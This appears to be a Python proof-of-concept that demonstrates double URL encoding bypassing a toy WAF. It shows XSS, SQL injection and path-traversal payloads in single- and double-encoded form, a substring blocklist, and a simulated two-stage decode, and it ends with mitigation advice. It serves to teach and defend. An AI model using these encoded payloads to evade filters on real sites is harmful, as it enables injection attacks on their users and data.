"""
PoC: Double URL Encoding — filter bypass via multi-stage decoders

Most web apps URL-decode their input exactly once. Some run two layers of
decoding (e.g., a CDN/WAF decodes, the origin decodes again). If the WAF
checks the input AFTER its single decode but BEFORE the origin's second
decode, attacker-controlled bytes can slip through.

Classic targets:
    - XSS:        '<script>'  ->  '%3Cscript%3E'  ->  '%253Cscript%253E'
    - SQLi:       "' OR 1=1"  ->  "%27%20OR%201%3D1"  ->  "%2527%2520OR%25201%253D1"
    - Path trav:  '../'       ->  '%2E%2E%2F'        ->  '%252E%252E%252F'

This PoC:
    1. Encodes a payload once, then twice.
    2. Models a 2-stage pipeline: WAF decodes once and runs a substring
       blocklist; origin decodes the *forwarded* string again before use.
    3. Shows the payload reaches the origin in cleartext despite the WAF
       blocking the single-encoded form.

Run:
    python pocs/05_double_encoding.py
"""

from __future__ import annotations

import urllib.parse

PAYLOAD = "<script>alert('XSS')</script>"
BLOCKLIST = ["<script", "javascript:", "onerror=", "../", "' OR ", "1=1"]


def encode_once(s: str) -> str:
    return urllib.parse.quote(s, safe="")


def encode_twice(s: str) -> str:
    return urllib.parse.quote(encode_once(s), safe="")


def waf_inspects(query: str) -> bool:
    """
    Toy WAF: URL-decodes the input ONCE, then case-insensitively checks
    against the blocklist. Returns True if the request should pass.
    """
    decoded = urllib.parse.unquote(query)
    low = decoded.lower()
    hit = next((b for b in BLOCKLIST if b.lower() in low), None)
    if hit:
        print(f"    WAF saw after 1 decode: {decoded!r}")
        print(f"    WAF blocks because it matched: {hit!r}")
        return False
    print(f"    WAF saw after 1 decode: {decoded!r}")
    print("    WAF passes — nothing in the blocklist matched.")
    return True


def origin_decodes(query: str) -> str:
    """Origin decodes ONCE MORE on top of what the WAF already did."""
    return urllib.parse.unquote(urllib.parse.unquote(query))


def show_pipeline(label: str, encoded: str) -> None:
    print(f"\n--- {label} ---")
    print(f"  on the wire: {encoded!r}")
    passed = waf_inspects(encoded)
    if passed:
        final = origin_decodes(encoded)
        print(f"    Origin's view after 2 decodes: {final!r}")
        if any(b.lower() in final.lower() for b in BLOCKLIST):
            print("    ** Payload landed at the origin in dangerous form. **")


def main() -> int:
    once = encode_once(PAYLOAD)
    twice = encode_twice(PAYLOAD)

    print("=" * 72)
    print("Payload encodings")
    print("=" * 72)
    print(f"  plaintext:        {PAYLOAD!r}")
    print(f"  single-encoded:   {once!r}")
    print(f"  double-encoded:   {twice!r}")

    print("\n" + "=" * 72)
    print("Pipeline runs")
    print("=" * 72)
    show_pipeline("Attempt 1: send single-encoded payload", once)
    show_pipeline("Attempt 2: send double-encoded payload", twice)

    print("\n" + "=" * 72)
    print("Mitigations")
    print("=" * 72)
    print("  - Canonicalize first: decode in a loop until the string stops")
    print("    changing, then validate the result.")
    print("  - Better: validate at the ORIGIN, not at an intermediate proxy.")
    print("  - Apply content-aware sanitization (HTML escape, SQL parametrize)")
    print("    at the boundary where the data leaves text and becomes code.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
